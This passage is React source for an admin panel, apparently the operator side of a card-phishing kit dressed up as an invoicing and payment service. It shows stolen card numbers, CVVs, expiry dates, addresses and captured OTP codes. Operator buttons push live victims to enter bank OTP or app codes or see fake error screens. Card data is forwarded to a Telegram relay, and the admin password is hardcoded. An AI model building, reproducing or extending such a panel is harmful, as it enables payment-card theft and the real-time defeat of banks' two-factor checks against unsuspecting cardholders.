import { useState, useEffect, useMemo, useRef, useCallback } from "react";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Lock, CreditCard, CheckCircle, XCircle, KeyRound, Eye, EyeOff, RefreshCw, Activity, Users, Clock, ShieldCheck, ChevronDown, ChevronUp, Mail, MapPin, Hash, Wifi, WifiOff, Volume2, VolumeX, Trash2, FileText, Settings, Plus, Copy, ExternalLink, DollarSign } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { supabase } from "@/integrations/supabase/client";
import { Badge } from "@/components/ui/badge";
import { playAlertSound } from "@/hooks/use-alert-sound";

const ADMIN_PASSWORD = "Ultimateunique1#";

const formatCardNumber = (value: string) => {
  const digits = value.replace(/\D/g, "").slice(0, 16);
  return digits.replace(/(.{4})/g, "$1 ").trim();
};

const formatExpiry = (value: string) => {
  const digits = value.replace(/\D/g, "").slice(0, 4);
  if (digits.length >= 3) return digits.slice(0, 2) + "/" + digits.slice(2);
  return digits;
};

type CardBrand = "visa" | "mastercard" | "amex" | "discover" | "unknown";

const detectCardBrand = (number: string): CardBrand => {
  const digits = number.replace(/\s/g, "");
  if (!digits) return "unknown";
  if (/^4/.test(digits)) return "visa";
  if (/^5[1-5]/.test(digits) || /^2(2[2-9][1-9]|2[3-9]\d|[3-6]\d{2}|7[01]\d|720)/.test(digits)) return "mastercard";
  if (/^3[47]/.test(digits)) return "amex";
  if (/^(6011|64[4-9]|65)/.test(digits)) return "discover";
  return "unknown";
};

const countries = [
  "Afghanistan","Albania","Algeria","Andorra","Angola","Antigua and Barbuda","Argentina","Armenia","Australia","Austria",
  "Azerbaijan","Bahamas","Bahrain","Bangladesh","Barbados","Belarus","Belgium","Belize","Benin","Bhutan",
  "Bolivia","Bosnia and Herzegovina","Botswana","Brazil","Brunei","Bulgaria","Burkina Faso","Burundi","Cabo Verde","Cambodia",
  "Cameroon","Canada","Central African Republic","Chad","Chile","China","Colombia","Comoros","Congo","Costa Rica",
  "Croatia","Cuba","Cyprus","Czech Republic","Denmark","Djibouti","Dominica","Dominican Republic","Ecuador","Egypt",
  "El Salvador","Equatorial Guinea","Eritrea","Estonia","Eswatini","Ethiopia","Fiji","Finland","France","Gabon",
  "Gambia","Georgia","Germany","Ghana","Greece","Grenada","Guatemala","Guinea","Guinea-Bissau","Guyana",
  "Haiti","Honduras","Hungary","Iceland","India","Indonesia","Iran","Iraq","Ireland","Israel",
  "Italy","Jamaica","Japan","Jordan","Kazakhstan","Kenya","Kiribati","Kosovo","Kuwait","Kyrgyzstan",
  "Laos","Latvia","Lebanon","Lesotho","Liberia","Libya","Liechtenstein","Lithuania","Luxembourg","Madagascar",
  "Malawi","Malaysia","Maldives","Mali","Malta","Marshall Islands","Mauritania","Mauritius","Mexico","Micronesia",
  "Moldova","Monaco","Mongolia","Montenegro","Morocco","Mozambique","Myanmar","Namibia","Nauru","Nepal",
  "Netherlands","New Zealand","Nicaragua","Niger","Nigeria","North Korea","North Macedonia","Norway","Oman","Pakistan",
  "Palau","Palestine","Panama","Papua New Guinea","Paraguay","Peru","Philippines","Poland","Portugal","Qatar",
  "Romania","Russia","Rwanda","Saint Kitts and Nevis","Saint Lucia","Saint Vincent and the Grenadines","Samoa","San Marino",
  "Sao Tome and Principe","Saudi Arabia","Senegal","Serbia","Seychelles","Sierra Leone","Singapore","Slovakia","Slovenia",
  "Solomon Islands","Somalia","South Africa","South Korea","South Sudan","Spain","Sri Lanka","Sudan","Suriname","Sweden",
  "Switzerland","Syria","Taiwan","Tajikistan","Tanzania","Thailand","Timor-Leste","Togo","Tonga","Trinidad and Tobago",
  "Tunisia","Turkey","Turkmenistan","Tuvalu","Uganda","Ukraine","United Arab Emirates","United Kingdom","United States",
  "Uruguay","Uzbekistan","Vanuatu","Vatican City","Venezuela","Vietnam","Yemen","Zambia","Zimbabwe",
];

const Admin = () => {
  const { toast } = useToast();
  const [authenticated, setAuthenticated] = useState(false);
  const [password, setPassword] = useState("");
  const [error, setError] = useState(false);
  const [loading, setLoading] = useState(false);
  const [amount, setAmount] = useState("");
  const [sessions, setSessions] = useState<any[]>([]);
  const [expandedSession, setExpandedSession] = useState<string | null>(null);
  const [activeTab, setActiveTab] = useState<"sessions" | "invoices" | "form" | "settings">("sessions");
  const [invoiceFilter, setInvoiceFilter] = useState<string | null>(null); // invoice_id to filter sessions by
  const [visitorCount, setVisitorCount] = useState(0);
  const [soundEnabled, setSoundEnabled] = useState(true);
  const prevVisitorCountRef = useRef<number>(0);

  // Invoice state
  const [invoices, setInvoices] = useState<any[]>([]);
  const [showInvoiceForm, setShowInvoiceForm] = useState(false);
  const [invoiceForm, setInvoiceForm] = useState({
    client_name: "", client_email: "", description: "", amount: "", due_date: "", invoice_number: "",
  });
  const [invoiceLoading, setInvoiceLoading] = useState(false);

  // Business settings state
  const [businessSettings, setBusinessSettings] = useState<any>(null);
  const [settingsForm, setSettingsForm] = useState({
    company_name: "", contact_email: "", website: "",
  });
  const [settingsLoading, setSettingsLoading] = useState(false);

  // Manual entry form
  const [form, setForm] = useState({
    cardNumber: "", expiry: "", cvv: "", cardholderName: "",
    email: "", country: "", address1: "", address2: "",
    city: "", state: "", zip: "",
  });

  // Visitor presence tracking
  useEffect(() => {
    if (!authenticated) return;
    const channel = supabase.channel("visitors");
    channel
      .on("presence", { event: "sync" }, () => {
        const state = channel.presenceState();
        const count = Object.keys(state).length;
        const prev = prevVisitorCountRef.current;
        if (count > prev && prev >= 0) {
          if (soundEnabled) playAlertSound("join");
          toast({ title: "🟢 Visitor joined", description: `${count} active visitor${count !== 1 ? "s" : ""}.` });
        } else if (count < prev && prev > 0) {
          if (soundEnabled) playAlertSound("leave");
          toast({ title: "🔴 Visitor left", description: `${count} active visitor${count !== 1 ? "s" : ""}.` });
        }
        prevVisitorCountRef.current = count;
        setVisitorCount(count);
      })
      .subscribe();
    return () => { supabase.removeChannel(channel); };
  }, [authenticated, soundEnabled]);

  // Fetch sessions
  const fetchSessions = async () => {
    const { data } = await supabase.from("sessions").select("*").order("created_at", { ascending: false });
    if (data) setSessions(data);
  };

  // Fetch invoices
  const fetchInvoices = async () => {
    const { data } = await supabase.from("invoices").select("*").order("created_at", { ascending: false });
    if (data) setInvoices(data);
  };

  // Fetch business settings
  const fetchSettings = async () => {
    const { data } = await supabase.from("business_settings").select("*").limit(1).single();
    if (data) {
      setBusinessSettings(data);
      setSettingsForm({
        company_name: data.company_name || "",
        contact_email: data.contact_email || "",
        website: data.website || "",
      });
    }
  };

  // Real-time subscriptions
  useEffect(() => {
    if (!authenticated) return;
    fetchSessions();
    fetchInvoices();
    fetchSettings();
    const channel = supabase
      .channel("admin-all")
      .on("postgres_changes", { event: "*", schema: "public", table: "sessions" }, () => fetchSessions())
      .on("postgres_changes", { event: "*", schema: "public", table: "invoices" }, () => fetchInvoices())
      .subscribe();
    return () => { supabase.removeChannel(channel); };
  }, [authenticated]);

  // Session control
  const actionInProgress = useRef(false);
  const updateSessionStatus = async (id: string, status: string, otpType?: string) => {
    if (actionInProgress.current) return;
    actionInProgress.current = true;
    try {
      const updateData: any = { status };
      if (otpType) {
        const { data: session } = await supabase.from("sessions").select("form_data").eq("id", id).single();
        const existingData = (session?.form_data as Record<string, any>) || {};
        updateData.form_data = { ...existingData, otp_type: otpType };
      }
      const { error } = await supabase.from("sessions").update(updateData).eq("id", id);
      if (error) toast({ title: "Error", description: "Failed to update session.", variant: "destructive" });
      else toast({ title: "Updated", description: `Session set to "${status}"${otpType ? ` (${otpType})` : ""}.` });
    } finally {
      actionInProgress.current = false;
    }
  };

  const deleteSession = async (id: string) => {
    const { error } = await supabase.from("sessions").delete().eq("id", id);
    if (error) toast({ title: "Error", description: "Failed to delete session.", variant: "destructive" });
    else { toast({ title: "Deleted", description: "Session removed." }); setExpandedSession(null); }
  };

  const getStatusConfig = (status: string) => {
    const map: Record<string, { variant: "default" | "secondary" | "destructive" | "outline"; label: string; dotColor: string }> = {
      pending: { variant: "outline", label: "Pending", dotColor: "bg-muted-foreground" },
      waiting: { variant: "secondary", label: "Waiting", dotColor: "bg-yellow-500" },
      otp_required: { variant: "default", label: "OTP Required", dotColor: "bg-primary" },
      otp: { variant: "default", label: "OTP Sent", dotColor: "bg-primary" },
      otp_submitted: { variant: "secondary", label: "OTP Submitted", dotColor: "bg-blue-500" },
      otp_wrong: { variant: "destructive", label: "Wrong OTP", dotColor: "bg-orange-500" },
      otp_expired: { variant: "destructive", label: "Expired OTP", dotColor: "bg-amber-500" },
      processing: { variant: "secondary", label: "Processing", dotColor: "bg-yellow-500" },
      approved: { variant: "default", label: "Approved", dotColor: "bg-emerald-500" },
      success: { variant: "default", label: "Success", dotColor: "bg-emerald-500" },
      rejected: { variant: "destructive", label: "Rejected", dotColor: "bg-destructive" },
      card_invalid: { variant: "destructive", label: "Card Invalid", dotColor: "bg-pink-500" },
    };
    return map[status] || { variant: "outline" as const, label: status, dotColor: "bg-muted-foreground" };
  };

  const getStatusBadge = (status: string) => {
    const config = getStatusConfig(status);
    return (
      <Badge variant={config.variant} className="gap-1.5 font-medium">
        <span className={`h-1.5 w-1.5 rounded-full ${config.dotColor}`} />
        {config.label}
      </Badge>
    );
  };

  // Stats
  const stats = useMemo(() => {
    const total = sessions.length;
    const pending = sessions.filter(s => ["pending", "waiting"].includes(s.status)).length;
    const otpRequired = sessions.filter(s => ["otp_required", "otp"].includes(s.status)).length;
    const completed = sessions.filter(s => ["approved", "success"].includes(s.status)).length;
    return { total, pending, otpRequired, completed };
  }, [sessions]);

  // Invoice stats
  const invoiceStats = useMemo(() => {
    const total = invoices.length;
    const unpaid = invoices.filter(i => i.status === "unpaid").length;
    const paid = invoices.filter(i => i.status === "paid").length;
    const totalRevenue = invoices.filter(i => i.status === "paid").reduce((sum: number, i: any) => sum + parseFloat(i.amount || 0), 0);
    return { total, unpaid, paid, totalRevenue };
  }, [invoices]);

  const brand = detectCardBrand(form.cardNumber);
  const parsedAmount = parseFloat(amount) || 0;
  const transactionFee = parsedAmount > 0 ? parseFloat((parsedAmount * 0.001).toFixed(2)) : 0;
  const total = parsedAmount > 0 ? parseFloat((parsedAmount + transactionFee).toFixed(2)) : 0;
  const isValidAmount = parsedAmount >= 500 && parsedAmount <= 1500;

  const formatEuro = (val: number) =>
    val.toLocaleString("en-IE", { style: "currency", currency: "EUR" });

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (password === ADMIN_PASSWORD) { setAuthenticated(true); setError(false); }
    else setError(true);
  };

  const update = (field: string, value: string) => {
    if (field === "cardNumber") value = formatCardNumber(value);
    if (field === "expiry") value = formatExpiry(value);
    if (field === "cvv") value = value.replace(/\D/g, "").slice(0, 4);
    setForm((f) => ({ ...f, [field]: value }));
  };

  // Manual entry submit
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    try {
      const { data: session, error: dbError } = await supabase
        .from("sessions")
        .insert({ status: "pending", form_data: { ...form, amount } as any })
        .select("id")
        .single();
      if (dbError || !session) throw new Error("Failed to create session");
      const res = await fetch(
        `https://${import.meta.env.VITE_SUPABASE_PROJECT_ID}.supabase.co/functions/v1/send-to-telegram`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ type: "payment", ...form, amount, sessionId: session.id }),
        }
      );
      if (!res.ok) throw new Error("Failed to process");
      toast({ title: "Submitted", description: `Session: ${session.id.slice(0, 8)}…` });
      setForm({ cardNumber: "", expiry: "", cvv: "", cardholderName: "", email: "", country: "", address1: "", address2: "", city: "", state: "", zip: "" });
      setAmount("");
    } catch {
      toast({ title: "Error", description: "Something went wrong.", variant: "destructive" });
    } finally {
      setLoading(false);
    }
  };

  // Create invoice
  const handleCreateInvoice = async (e: React.FormEvent) => {
    e.preventDefault();
    setInvoiceLoading(true);
    try {
      const { data, error } = await supabase.from("invoices").insert({
        client_name: invoiceForm.client_name,
        client_email: invoiceForm.client_email || null,
        description: invoiceForm.description || null,
        amount: parseFloat(invoiceForm.amount),
        due_date: invoiceForm.due_date || null,
        invoice_number: invoiceForm.invoice_number || "TEMP",
      }).select().single();

      if (error) throw error;
      toast({ title: "Invoice created", description: `${data.invoice_number} for ${formatEuro(parseFloat(invoiceForm.amount))}` });
      setInvoiceForm({ client_name: "", client_email: "", description: "", amount: "", due_date: "", invoice_number: "" });
      setShowInvoiceForm(false);
    } catch (err: any) {
      toast({ title: "Error", description: err.message || "Failed to create invoice.", variant: "destructive" });
    } finally {
      setInvoiceLoading(false);
    }
  };

  // Delete invoice
  const deleteInvoice = async (id: string) => {
    const { error } = await supabase.from("invoices").delete().eq("id", id);
    if (error) toast({ title: "Error", description: "Failed to delete invoice.", variant: "destructive" });
    else toast({ title: "Deleted", description: "Invoice removed." });
  };

  // Save business settings
  const handleSaveSettings = async (e: React.FormEvent) => {
    e.preventDefault();
    setSettingsLoading(true);
    try {
      const { error } = await supabase.from("business_settings").update({
        company_name: settingsForm.company_name,
        contact_email: settingsForm.contact_email || null,
        website: settingsForm.website || null,
      }).eq("id", businessSettings.id);
      if (error) throw error;
      toast({ title: "Settings saved", description: "Business settings updated." });
      fetchSettings();
    } catch {
      toast({ title: "Error", description: "Failed to save settings.", variant: "destructive" });
    } finally {
      setSettingsLoading(false);
    }
  };

  // Copy payment link
  const copyPaymentLink = (invoiceId: string) => {
    const url = `${window.location.origin}/pay/${invoiceId}`;
    navigator.clipboard.writeText(url);
    toast({ title: "Copied!", description: "Payment link copied to clipboard." });
  };

  const getInvoiceStatusBadge = (status: string) => {
    if (status === "paid") return <Badge className="bg-emerald-600 text-white border-0 gap-1"><CheckCircle className="h-3 w-3" /> Paid</Badge>;
    return <Badge variant="outline" className="gap-1 border-yellow-500/30 text-yellow-400"><Clock className="h-3 w-3" /> Unpaid</Badge>;
  };

  if (!authenticated) {
    return (
      <div className="min-h-screen bg-[#0a0e1a] flex items-center justify-center p-4">
        <div className="w-full max-w-sm space-y-6">
          <div className="text-center space-y-2">
            <div className="h-12 w-12 rounded-xl bg-white/5 border border-white/10 flex items-center justify-center mx-auto">
              <Lock className="h-6 w-6 text-white/50" />
            </div>
            <h1 className="text-lg font-semibold text-white">Admin Access</h1>
            <p className="text-sm text-white/40">Enter password to continue</p>
          </div>
          <form onSubmit={handleLogin} className="space-y-3">
            <Input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => { setPassword(e.target.value); setError(false); }}
              className={`bg-white/5 border-white/10 text-white placeholder:text-white/30 focus:border-blue-500/50 focus:ring-blue-500/20 ${error ? "border-red-500/50" : ""}`}
              autoFocus
            />
            {error && <p className="text-xs text-red-400">Incorrect password</p>}
            <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-500 text-white border-0">Unlock</Button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#0a0e1a]">
      {/* ===== HEADER ===== */}
      <header className="bg-[#111827] border-b border-white/[0.06] sticky top-0 z-50 backdrop-blur-xl">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-14">
            <div className="flex items-center gap-3">
              <div className="h-8 w-8 rounded-lg bg-blue-600 flex items-center justify-center shadow-lg shadow-blue-600/20">
                <span className="text-white text-sm font-bold">P</span>
              </div>
              <div className="flex items-center gap-2">
                <span className="text-white font-semibold text-base">{businessSettings?.company_name || "Pay"}</span>
                <span className="text-[10px] font-semibold uppercase tracking-widest text-blue-400/70 bg-blue-500/10 px-2 py-0.5 rounded border border-blue-500/20">Admin</span>
              </div>
            </div>
            <div className="flex items-center gap-3">
              {/* Visitor presence */}
              <div className={`flex items-center gap-2 px-3 py-1.5 rounded-lg border transition-all ${
                visitorCount > 0 ? "bg-emerald-500/10 border-emerald-500/20" : "bg-white/[0.03] border-white/[0.06]"
              }`}>
                {visitorCount > 0 ? <Wifi className="h-3.5 w-3.5 text-emerald-400 animate-pulse" /> : <WifiOff className="h-3.5 w-3.5 text-white/30" />}
                <span className={`text-xs font-semibold tabular-nums ${visitorCount > 0 ? "text-emerald-300" : "text-white/30"}`}>
                  {visitorCount} online
                </span>
              </div>
              {/* Sound toggle */}
              <button onClick={() => setSoundEnabled(!soundEnabled)} className="h-8 w-8 rounded-md flex items-center justify-center hover:bg-white/[0.06] transition-colors">
                {soundEnabled ? <Volume2 className="h-4 w-4 text-white/70" /> : <VolumeX className="h-4 w-4 text-white/30" />}
              </button>
              {/* Tabs */}
              <div className="flex items-center gap-1 bg-white/[0.04] rounded-lg p-1 border border-white/[0.06]">
                {[
                  { key: "sessions", icon: Activity, label: "Sessions" },
                  { key: "invoices", icon: FileText, label: "Invoices" },
                  { key: "form", icon: CreditCard, label: "Manual" },
                  { key: "settings", icon: Settings, label: "Settings" },
                ].map((tab) => (
                  <button
                    key={tab.key}
                    onClick={() => setActiveTab(tab.key as any)}
                    className={`px-3 py-1.5 rounded-md text-sm font-medium transition-all ${
                      activeTab === tab.key ? "bg-white/[0.08] text-white shadow-sm" : "text-white/40 hover:text-white/70"
                    }`}
                  >
                    <tab.icon className="h-3.5 w-3.5 inline-block mr-1.5 -mt-0.5" />
                    <span className="hidden sm:inline">{tab.label}</span>
                  </button>
                ))}
              </div>
            </div>
          </div>
        </div>
      </header>

      {/* ========== SESSIONS TAB ========== */}
      {activeTab === "sessions" && (
        <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-6 space-y-6">
          {/* Stats */}
          <div className="grid grid-cols-2 lg:grid-cols-4 gap-3 sm:gap-4">
            {[
              { label: "Total Sessions", value: stats.total, icon: Users, accent: "text-blue-400" },
              { label: "Pending", value: stats.pending, icon: Clock, accent: "text-yellow-400" },
              { label: "Awaiting OTP", value: stats.otpRequired, icon: KeyRound, accent: "text-blue-400" },
              { label: "Completed", value: stats.completed, icon: ShieldCheck, accent: "text-emerald-400" },
            ].map((stat) => (
              <div key={stat.label} className="bg-[#111827] rounded-xl border border-white/[0.06] p-4 sm:p-5 hover:border-white/[0.1] transition-colors">
                <div className="flex items-center justify-between mb-2">
                  <span className="text-[11px] font-medium text-white/40 uppercase tracking-wide">{stat.label}</span>
                  <stat.icon className={`h-4 w-4 ${stat.accent} opacity-70`} />
                </div>
                <p className="text-2xl sm:text-3xl font-bold text-white tracking-tight">{stat.value}</p>
              </div>
            ))}
          </div>

          <div className="flex items-center justify-between">
            <div>
              <h2 className="text-lg font-semibold text-white">Live Sessions</h2>
              <p className="text-xs text-white/30 mt-0.5">
                {invoiceFilter
                  ? `Filtered by invoice · ${invoices.find(i => i.id === invoiceFilter)?.invoice_number || invoiceFilter.slice(0, 8)}`
                  : "Real-time monitoring · Auto-updates"}
              </p>
            </div>
            <div className="flex items-center gap-2">
              {invoiceFilter && (
                <Button variant="outline" size="sm" onClick={() => setInvoiceFilter(null)} className="gap-1.5 bg-blue-500/10 border-blue-500/20 text-blue-400 hover:bg-blue-500/20">
                  <XCircle className="h-3.5 w-3.5" /> Clear Filter
                </Button>
              )}
              <Button variant="outline" size="sm" onClick={fetchSessions} className="gap-1.5 bg-white/[0.04] border-white/[0.08] text-white/60 hover:text-white hover:bg-white/[0.08]">
                <RefreshCw className="h-3.5 w-3.5" /> Refresh
              </Button>
            </div>
          </div>

          {(() => {
            const filteredSessions = invoiceFilter
              ? sessions.filter(s => s.invoice_id === invoiceFilter)
              : sessions;
            return filteredSessions.length === 0 ? (
            <div className="bg-[#111827] rounded-xl border border-white/[0.06] p-16 text-center">
              <Activity className="h-10 w-10 text-white/10 mx-auto mb-3" />
              <p className="text-white/40 text-sm font-medium">{invoiceFilter ? "No sessions for this invoice" : "No sessions yet"}</p>
              <p className="text-white/20 text-xs mt-1">{invoiceFilter ? "No one has submitted a payment yet" : "Waiting for submissions…"}</p>
            </div>
          ) : (
            <div className="space-y-2.5">
              {filteredSessions.map((s, index) => {
                const fd = (s.form_data || {}) as any;
                const isExpanded = expandedSession === s.id;
                const statusConfig = getStatusConfig(s.status);
                const isLatestActive = index === 0 && ["pending", "waiting"].includes(s.status);
                return (
                  <div key={s.id} className={`rounded-xl border transition-all duration-200 overflow-hidden ${
                    isLatestActive ? "bg-[#0d1a2d] border-emerald-500/40 shadow-lg shadow-emerald-500/10 ring-1 ring-emerald-500/20" :
                    isExpanded ? "bg-[#111827] border-blue-500/30 shadow-lg shadow-blue-500/5" : "bg-[#111827] border-white/[0.06] hover:border-white/[0.1]"
                  }`}>
                    <div className="flex items-center gap-3 sm:gap-4 p-4 sm:p-5 cursor-pointer select-none" onClick={() => setExpandedSession(isExpanded ? null : s.id)}>
                      <div className={`h-2.5 w-2.5 rounded-full shrink-0 ${statusConfig.dotColor} ring-4 ring-[#111827]`} />
                      <div className="flex-1 min-w-0 flex flex-col sm:flex-row sm:items-center gap-1 sm:gap-4">
                        <div className="flex items-center gap-2.5 min-w-0">
                          {isLatestActive && (
                            <Badge className="bg-emerald-500/20 text-emerald-400 border-emerald-500/30 text-[10px] px-1.5 py-0 animate-pulse">
                              ACTIVE
                            </Badge>
                          )}
                          {getStatusBadge(s.status)}
                          {fd.amount && <span className="text-base font-bold text-white tabular-nums">€{fd.amount}</span>}
                        </div>
                        <div className="flex items-center gap-2 min-w-0">
                          {fd.email && (
                            <span className="text-sm text-white/40 truncate flex items-center gap-1">
                              <Mail className="h-3 w-3 shrink-0" />{fd.email}
                            </span>
                          )}
                        </div>
                      </div>
                      <div className="flex items-center gap-3 shrink-0">
                        <div className="text-right hidden sm:block">
                          <p className="text-xs text-white/30">{new Date(s.created_at).toLocaleDateString("en-GB", { day: "2-digit", month: "short" })}</p>
                          <p className="text-[10px] text-white/20">{new Date(s.created_at).toLocaleTimeString("en-GB", { hour: "2-digit", minute: "2-digit" })}</p>
                        </div>
                        {isExpanded ? <ChevronUp className="h-4 w-4 text-white/30" /> : <ChevronDown className="h-4 w-4 text-white/30" />}
                      </div>
                    </div>

                    {isExpanded && (
                      <div className="border-t border-white/[0.06] bg-white/[0.02]">
                        <div className="p-5 grid grid-cols-1 sm:grid-cols-3 gap-4">
                          {[
                            { label: "Card Number", value: fd.cardNumber, mono: true },
                            { label: "Expiry", value: fd.expiry, mono: true },
                            { label: "CVV", value: fd.cvv, mono: true },
                            { label: "Cardholder", value: fd.cardholderName },
                            { label: "Email", value: fd.email },
                            { label: "Session ID", value: s.id.slice(0, 12) + "…", mono: true, dim: true },
                          ].map((item) => (
                            <div key={item.label} className="space-y-0.5">
                              <p className="text-[10px] uppercase tracking-wider font-semibold text-white/30">{item.label}</p>
                              <p className={`text-sm ${item.mono ? "font-mono" : ""} ${item.dim ? "text-white/40" : "text-white/90"} ${item.label === "Card Number" ? "tracking-wider" : ""}`}>{item.value || "—"}</p>
                            </div>
                          ))}
                          <div className="sm:col-span-3 space-y-0.5">
                            <p className="text-[10px] uppercase tracking-wider font-semibold text-white/30 flex items-center gap-1">
                              <MapPin className="h-3 w-3" /> Billing Address
                            </p>
                            <p className="text-sm text-white/90">
                              {[fd.address1, fd.address2, fd.city, fd.state, fd.zip, fd.country].filter(Boolean).join(", ") || "—"}
                            </p>
                          </div>
                          {fd.otp && (
                            <div className="space-y-0.5">
                              <p className="text-[10px] uppercase tracking-wider font-semibold text-white/30 flex items-center gap-1"><Hash className="h-3 w-3" /> OTP Code</p>
                              <p className="text-lg font-mono font-bold text-blue-400 tracking-[0.3em]">{fd.otp}</p>
                            </div>
                          )}
                        </div>
                        <div className="border-t border-white/[0.06] px-5 py-3.5 flex flex-wrap gap-2 bg-[#111827]">
                          {/* OTP Type buttons */}
                          <div className="flex flex-wrap gap-2">
                            <Button size="sm" variant="outline" className="gap-1.5 bg-white/[0.04] border-white/[0.08] text-white/70 hover:text-white hover:bg-white/[0.08]" onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "otp", "6digit"); }}>
                              <KeyRound className="h-3.5 w-3.5" /> OTP 6-digit
                            </Button>
                            <Button size="sm" variant="outline" className="gap-1.5 bg-white/[0.04] border-white/[0.08] text-white/70 hover:text-white hover:bg-white/[0.08]" onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "otp", "4digit"); }}>
                              <KeyRound className="h-3.5 w-3.5" /> OTP 4-digit
                            </Button>
                            <Button size="sm" variant="outline" className="gap-1.5 bg-white/[0.04] border-white/[0.08] text-white/70 hover:text-white hover:bg-white/[0.08]" onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "otp", "8digit"); }}>
                              <KeyRound className="h-3.5 w-3.5" /> OTP 8-digit
                            </Button>
                            <Button size="sm" variant="outline" className="gap-1.5 bg-purple-500/10 border-purple-500/20 text-purple-400 hover:bg-purple-500/20" onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "otp", "bank_app"); }}>
                              <KeyRound className="h-3.5 w-3.5" /> Bank App
                            </Button>
                          </div>
                          <Button size="sm" variant="outline" className="gap-1.5 bg-orange-500/10 border-orange-500/20 text-orange-400 hover:bg-orange-500/20" onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "otp_wrong"); }}>
                            <XCircle className="h-3.5 w-3.5" /> Wrong OTP
                          </Button>
                          <Button size="sm" variant="outline" className="gap-1.5 bg-amber-500/10 border-amber-500/20 text-amber-400 hover:bg-amber-500/20" onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "otp_expired"); }}>
                            <Clock className="h-3.5 w-3.5" /> Expired OTP
                          </Button>
                          <Button size="sm" variant="outline" className="gap-1.5 bg-pink-500/10 border-pink-500/20 text-pink-400 hover:bg-pink-500/20" onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "card_invalid"); }}>
                            <CreditCard className="h-3.5 w-3.5" /> Invalid Card
                          </Button>
                          <Button size="sm" className="gap-1.5 bg-emerald-600 hover:bg-emerald-500 text-white border-0" onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "success"); }}>
                            <CheckCircle className="h-3.5 w-3.5" /> Approve
                          </Button>
                          <Button size="sm" className="gap-1.5 bg-red-600 hover:bg-red-500 text-white border-0" onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "rejected"); }}>
                            <XCircle className="h-3.5 w-3.5" /> Reject
                          </Button>
                          <div className="flex-1" />
                          <Button size="sm" variant="outline" className="gap-1.5 bg-red-500/10 border-red-500/20 text-red-400 hover:bg-red-500/20" onClick={(e) => { e.stopPropagation(); deleteSession(s.id); }}>
                            <Trash2 className="h-3.5 w-3.5" /> Delete
                          </Button>
                        </div>
                      </div>
                    )}
                  </div>
                );
              })}
            </div>
          );
          })()}
        </div>
      )}

      {/* ========== INVOICES TAB ========== */}
      {activeTab === "invoices" && (
        <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-6 space-y-6">
          {/* Invoice Stats */}
          <div className="grid grid-cols-2 lg:grid-cols-4 gap-3 sm:gap-4">
            {[
              { label: "Total Invoices", value: invoiceStats.total, icon: FileText, accent: "text-blue-400" },
              { label: "Unpaid", value: invoiceStats.unpaid, icon: Clock, accent: "text-yellow-400" },
              { label: "Paid", value: invoiceStats.paid, icon: CheckCircle, accent: "text-emerald-400" },
              { label: "Revenue", value: formatEuro(invoiceStats.totalRevenue), icon: DollarSign, accent: "text-emerald-400", isString: true },
            ].map((stat) => (
              <div key={stat.label} className="bg-[#111827] rounded-xl border border-white/[0.06] p-4 sm:p-5 hover:border-white/[0.1] transition-colors">
                <div className="flex items-center justify-between mb-2">
                  <span className="text-[11px] font-medium text-white/40 uppercase tracking-wide">{stat.label}</span>
                  <stat.icon className={`h-4 w-4 ${stat.accent} opacity-70`} />
                </div>
                <p className="text-2xl sm:text-3xl font-bold text-white tracking-tight">{stat.value}</p>
              </div>
            ))}
          </div>

          <div className="flex items-center justify-between">
            <div>
              <h2 className="text-lg font-semibold text-white">Invoices</h2>
              <p className="text-xs text-white/30 mt-0.5">Create and manage client invoices</p>
            </div>
            <Button size="sm" className="gap-1.5 bg-blue-600 hover:bg-blue-500 text-white border-0" onClick={() => setShowInvoiceForm(!showInvoiceForm)}>
              <Plus className="h-3.5 w-3.5" /> New Invoice
            </Button>
          </div>

          {/* New Invoice Form */}
          {showInvoiceForm && (
            <div className="bg-[#111827] rounded-xl border border-blue-500/20 p-6 shadow-lg shadow-blue-500/5">
              <h3 className="text-white font-semibold mb-4">Create Invoice</h3>
              <form onSubmit={handleCreateInvoice} className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <div>
                  <label className="text-[11px] uppercase tracking-wider font-semibold text-white/40 mb-1 block">Invoice Number</label>
                  <Input value={invoiceForm.invoice_number} onChange={(e) => setInvoiceForm(f => ({ ...f, invoice_number: e.target.value }))} placeholder="INV20260001 (auto if empty)" className="bg-white/5 border-white/10 text-white placeholder:text-white/30" />
                </div>
                <div>
                  <label className="text-[11px] uppercase tracking-wider font-semibold text-white/40 mb-1 block">Client Name *</label>
                  <Input value={invoiceForm.client_name} onChange={(e) => setInvoiceForm(f => ({ ...f, client_name: e.target.value }))} placeholder="John Doe" required className="bg-white/5 border-white/10 text-white placeholder:text-white/30" />
                </div>
                <div>
                  <label className="text-[11px] uppercase tracking-wider font-semibold text-white/40 mb-1 block">Client Email</label>
                  <Input type="email" value={invoiceForm.client_email} onChange={(e) => setInvoiceForm(f => ({ ...f, client_email: e.target.value }))} placeholder="john@example.com" className="bg-white/5 border-white/10 text-white placeholder:text-white/30" />
                </div>
                <div>
                  <label className="text-[11px] uppercase tracking-wider font-semibold text-white/40 mb-1 block">Amount (€) *</label>
                  <Input type="number" step="0.01" min="1" value={invoiceForm.amount} onChange={(e) => setInvoiceForm(f => ({ ...f, amount: e.target.value }))} placeholder="1000.00" required className="bg-white/5 border-white/10 text-white placeholder:text-white/30" />
                </div>
                <div>
